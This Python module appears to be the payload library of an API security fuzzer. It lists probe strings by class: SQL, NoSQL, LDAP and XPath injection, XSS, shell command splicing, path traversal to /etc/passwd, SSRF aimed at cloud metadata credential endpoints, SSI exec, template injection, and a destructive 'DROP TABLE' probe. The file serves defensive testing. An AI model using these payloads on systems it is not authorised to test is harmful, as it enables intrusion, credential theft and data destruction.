"""Payload library, grouped by vulnerability class.

Each entry is a (payload_string, technique_label) tuple so the analyzer can
report what the payload was attempting to demonstrate.
"""

from __future__ import annotations

from typing import Dict, List, Tuple

Payload = Tuple[str, str]  # (payload, technique)


SQL_INJECTION: List[Payload] = [
    ("' OR '1'='1", "boolean-based tautology"),
    ("' OR 1=1--", "boolean-based comment"),
    ("\" OR \"\"=\"", "double-quoted tautology"),
    ("') OR ('1'='1", "parenthesized tautology"),
    ("' UNION SELECT NULL--", "union-based probe"),
    ("' UNION SELECT NULL,NULL--", "union-based 2-col probe"),
    ("'; DROP TABLE users--", "stacked statement (destructive probe)"),
    ("' AND SLEEP(5)--", "time-based blind (MySQL)"),
    ("'; WAITFOR DELAY '0:0:5'--", "time-based blind (MSSQL)"),
    ("' AND 1=CONVERT(int, @@version)--", "error-based MSSQL"),
    ("' AND extractvalue(1,concat(0x7e,version()))--", "error-based MySQL"),
    ("'||(SELECT '')||'", "string concat probe (Oracle)"),
]

XSS: List[Payload] = [
    ("<script>alert(1)</script>", "classic script tag"),
    ("\"><script>alert(1)</script>", "attribute-break script tag"),
    ("'><svg/onload=alert(1)>", "svg onload"),
    ("javascript:alert(1)", "javascript: URI"),
    ("<img src=x onerror=alert(1)>", "img onerror"),
    ("<iframe src=javascript:alert(1)>", "iframe javascript URI"),
    ("</textarea><script>alert(1)</script>", "textarea-break"),
]

COMMAND_INJECTION: List[Payload] = [
    ("; id", "semicolon shell metachar"),
    ("| id", "pipe shell metachar"),
    ("`id`", "backtick command substitution"),
    ("$(id)", "dollar-paren command substitution"),
    ("&& id", "logical and"),
    ("; sleep 5", "time-based blind"),
    ("| ping -c 1 127.0.0.1", "OOB ping probe"),
    ("\n/bin/sh -c id\n", "newline command splice"),
]

PATH_TRAVERSAL: List[Payload] = [
    ("../../../../etc/passwd", "linux passwd"),
    ("..%2f..%2f..%2fetc%2fpasswd", "url-encoded traversal"),
    ("....//....//etc/passwd", "double dot bypass"),
    ("..\\..\\..\\windows\\win.ini", "windows traversal"),
    ("/etc/passwd%00.png", "null byte bypass"),
    ("file:///etc/passwd", "file:// scheme"),
    # Filter-bypass variants.
    ("..;/..;/..;/etc/passwd", "semicolon bypass (Java/Tomcat)"),
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "dot-encoded traversal"),
    ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "fully-encoded traversal"),
    ("..%c0%af..%c0%afetc/passwd", "overlong UTF-8 slash bypass"),
    ("//etc/passwd", "absolute path injection"),
    ("\\\\attacker.example\\share\\win.ini", "UNC path injection"),
]

SSRF: List[Payload] = [
    ("http://127.0.0.1:80/", "localhost http"),
    ("http://169.254.169.254/latest/meta-data/", "aws metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp metadata"),
    ("http://[::1]/", "ipv6 localhost"),
    ("http://0.0.0.0/", "any-interface probe"),
    ("gopher://127.0.0.1:6379/_INFO", "gopher redis probe"),
    ("dict://127.0.0.1:11211/stats", "memcached probe"),
    # IP-encoding variants that bypass naive allowlist filters.
    ("http://[fd00:ec2::254]/latest/meta-data/", "aws ipv6 metadata"),
    ("http://169.254.170.2/v2/credentials/", "aws ecs task metadata"),
    ("http://metadata/", "azure metadata short name"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure instance metadata"),
    ("http://100.100.100.200/latest/meta-data/", "alibaba metadata"),
    ("http://192.0.0.192/latest/meta-data/", "oracle cloud metadata"),
    ("http://kubernetes.default.svc/api", "kubernetes service probe"),
    ("http://0x7f000001/", "hex-encoded localhost"),
    ("http://2130706433/", "decimal-encoded localhost"),
    ("http://017700000001/", "octal-encoded localhost"),
    ("http://127.1/", "shortened loopback"),
]

HEADER_INJECTION: List[Payload] = [
    ("foo\r\nX-Injected: yes", "CRLF header injection"),
    ("foo\r\n\r\n<html>injected</html>", "response splitting"),
    ("evil.example.com", "host header override"),
]

AUTH_BYPASS: List[Payload] = [
    ("", "empty credential"),
    ("null", "literal null"),
    ("undefined", "literal undefined"),
    ("admin", "default username"),
    ("0", "numeric zero"),
    ("' OR '1'='1", "sqli in auth field"),
]

INFO_DISCLOSURE: List[Payload] = [
    ("{", "malformed JSON open brace"),
    ("]]>", "XML CDATA terminator"),
    ("%00", "null byte"),
    ("AAAA" * 1024, "oversized input"),
    ("../", "single traversal probe"),
    ("\x00\x01\x02\x03", "control bytes"),
]

NOSQL_INJECTION: List[Payload] = [
    ('{"$ne": null}', "$ne null operator"),
    ('{"$gt": ""}', "$gt empty string"),
    ('{"$where": "sleep(5000)"}', "$where time-based"),
    ('{"$regex": ".*"}', "$regex wildcard"),
    ("';return(true);var x='", "JS injection in $where"),
    ('true, $where: "1 == 1"', "$where always-true"),
    ("[$ne]=1", "PHP-style operator smuggling"),
]

SSTI: List[Payload] = [
    ("{{7777*7777}}", "Jinja/Twig arithmetic"),
    ("${7777*7777}", "FreeMarker/Spring EL arithmetic"),
    ("<%= 7777*7777 %>", "ERB/JSP arithmetic"),
    ("#{7777*7777}", "Ruby/Pug interpolation"),
    ("{{ ''.__class__ }}", "Jinja class probe"),
    ("${{<%[%'\"}}%\\", "template polyglot syntax"),
]

LDAP_INJECTION: List[Payload] = [
    ("*", "wildcard"),
    ("*)(uid=*))(|(uid=*", "filter break"),
    ("admin*)((|userPassword=*)", "password extraction probe"),
    ("*)(|(objectclass=*", "objectclass wildcard"),
]

XPATH_INJECTION: List[Payload] = [
    ("' or '1'='1", "boolean-based tautology"),
    ("') or ('1'='1", "parenthesized tautology"),
    ("' or count(/*)>0 or '", "count probe"),
    ("]|//*", "node escape"),
]

PROTOTYPE_POLLUTION: List[Payload] = [
    ('{"__proto__": {"polluted": "apifz_pp_canary"}}', "__proto__ assignment"),
    ('{"constructor": {"prototype": {"polluted": "apifz_pp_canary"}}}', "constructor.prototype assignment"),
    ("__proto__[polluted]=apifz_pp_canary", "query-style proto pollution"),
]

OPEN_REDIRECT: List[Payload] = [
    ("https://evil.example.com/", "absolute external URL"),
    ("//evil.example.com/", "protocol-relative external URL"),
    ("/\\evil.example.com", "backslash bypass"),
    ("https:evil.example.com", "no-slash bypass"),
    ("javascript:alert(1)", "javascript: URI"),
    ("http://127.0.0.1@evil.example.com", "userinfo trick"),
]

SSI_INJECTION: List[Payload] = [
    ("<!--#exec cmd=\"id\"-->", "SSI exec command"),
    ("<!--#include file=\"/etc/passwd\"-->", "SSI file include"),
    ("<!--#include virtual=\"/etc/passwd\"-->", "SSI virtual include"),
    ("<!--#exec cgi=\"/bin/cat /etc/passwd\"-->", "SSI cgi exec"),
    ("<!--#echo var=\"HTTP_USER_AGENT\"-->", "SSI variable echo"),
]


# ---------------------------------------------------------------------------
# v1.9: type-aware ("type juggling") payloads.
#
# When the OpenAPI spec declares a parameter as boolean/integer/number/string,
# the fuzzer picks the matching list below instead of running every payload.
# The goal is to expose weak input validation — a server that accepts "yes"
# where it asked for a boolean, or "abc" where it asked for an integer, is a
# precursor to deeper type-confusion bugs (PHP `==`, JS truthy strings,
# Python ast.literal_eval, etc.).
# ---------------------------------------------------------------------------

BOOLEAN_TYPE_JUGGLING: List[Payload] = [
    ("1", "truthy integer"),
    ("0", "falsy integer"),
    ("2", "out-of-range integer (truthy in most langs)"),
    ("-1", "negative integer (truthy)"),
    ("yes", "English truthy string"),
    ("no", "English falsy string"),
    ("on", "HTML-checkbox truthy"),
    ("off", "HTML-checkbox falsy"),
    ("TRUE", "uppercase TRUE"),
    ("FALSE", "uppercase FALSE"),
    ("null", "literal null"),
    ("undefined", "literal undefined"),
    ("[]", "empty array (PHP truthy by cast)"),
    ("{}", "empty object"),
    ('"true"', "quoted JSON string 'true'"),
    ('"false"', "quoted JSON string 'false' (truthy in JS/PHP)"),
    ("true,false", "CSV pair"),
]

NUMERIC_TYPE_JUGGLING: List[Payload] = [
    ("-1", "negative one (often a sentinel)"),
    ("0", "zero"),
    ("999999999", "32-bit integer near overflow"),
    ("9223372036854775808", "INT64_MAX + 1"),
    ("1.7976931348623157e308", "near double max"),
    ("Infinity", "JSON-illegal infinity"),
    ("-Infinity", "JSON-illegal negative infinity"),
    ("NaN", "JSON-illegal NaN"),
    ("1e1000", "exponent overflow"),
    ("0x41", "hex literal"),
    ("0o777", "octal literal"),
    ("null", "literal null"),
    ('"42"', "JSON-quoted numeric string"),
    ("abc", "non-numeric string"),
    ("1,2", "comma-separated (CSV smuggling)"),
    ("1 OR 1=1", "SQL-flavoured numeric"),
    ("true", "boolean where number expected"),
]

STRING_TYPE_JUGGLING: List[Payload] = [
    ("", "empty string"),
    (" ", "single space"),
    ("null", "literal null string"),
    ("0", "numeric zero string (PHP falsy)"),
    ("true", "boolean-looking string"),
    ("false", "boolean-looking string"),
    ('""', "JSON-quoted empty string"),
    ("[]", "array-looking string"),
    ("\u0000", "embedded NUL byte"),
    ("A" * 10000, "10KB oversize string"),
]

TYPE_JUGGLING_BY_TYPE: Dict[str, List[Payload]] = {
    "boolean": BOOLEAN_TYPE_JUGGLING,
    "integer": NUMERIC_TYPE_JUGGLING,
    "number": NUMERIC_TYPE_JUGGLING,
    "string": STRING_TYPE_JUGGLING,
}


PAYLOADS: Dict[str, List[Payload]] = {
    "sql_injection": SQL_INJECTION,
    "xss": XSS,
    "command_injection": COMMAND_INJECTION,
    "path_traversal": PATH_TRAVERSAL,
    "ssrf": SSRF,
    "header_injection": HEADER_INJECTION,
    "auth_bypass": AUTH_BYPASS,
    "info_disclosure": INFO_DISCLOSURE,
    "nosql_injection": NOSQL_INJECTION,
    "ssti": SSTI,
    "ldap_injection": LDAP_INJECTION,
    "xpath_injection": XPATH_INJECTION,
    "prototype_pollution": PROTOTYPE_POLLUTION,
    "open_redirect": OPEN_REDIRECT,
    "ssi_injection": SSI_INJECTION,
    # v1.9: empty-sentinel category. The fuzzer special-cases it and picks the
    # real payload list per parameter via TYPE_JUGGLING_BY_TYPE above.
    "type_juggling": [],
}


CATEGORY_LABELS: Dict[str, str] = {
    "sql_injection": "SQL Injection",
    "xss": "Cross-Site Scripting",
    "command_injection": "Command Injection",
    "path_traversal": "Path Traversal",
    "ssrf": "Server-Side Request Forgery",
    "header_injection": "Header Injection",
    "auth_bypass": "Authentication Bypass",
    "info_disclosure": "Information Disclosure",
    "nosql_injection": "NoSQL Injection",
    "ssti": "Server-Side Template Injection",
    "ldap_injection": "LDAP Injection",
    "xpath_injection": "XPath Injection",
    "prototype_pollution": "Prototype Pollution",
    "open_redirect": "Open Redirect",
    "ssi_injection": "SSI Injection",
    "type_juggling": "Type Juggling (boolean / number / string)",
    # Observational categories emitted by misconfig.py / extra_checks.py / jwt_checks.py / schema_checks.py.
    "misconfiguration": "Misconfiguration",
    "mass_assignment": "Mass Assignment",
    "http_parameter_pollution": "HTTP Parameter Pollution",
    "method_override": "HTTP Method Override",
    "content_type_confusion": "Content-Type Confusion",
    "canary_reflection": "Input Reflection",
    "schema_violation": "Schema Violation",
    "jwt": "JWT Attack",
}


def available_categories() -> List[str]:
    return list(PAYLOADS.keys())


def payloads_for(categories: List[str]) -> Dict[str, List[Payload]]:
    """Return the payload subset matching the requested categories."""
    return {cat: PAYLOADS[cat] for cat in categories if cat in PAYLOADS}


def payloads_for_type(schema_type: str) -> List[Payload]:
    """Return the type-juggling payload list for the given parameter schema type.

    Falls back to the string list for unknown types (e.g. `array`, `object`,
    or missing). Used by `fuzzer.run_scan` when iterating the `type_juggling`
    category.
    """
    return TYPE_JUGGLING_BY_TYPE.get((schema_type or "string").lower(), STRING_TYPE_JUGGLING)
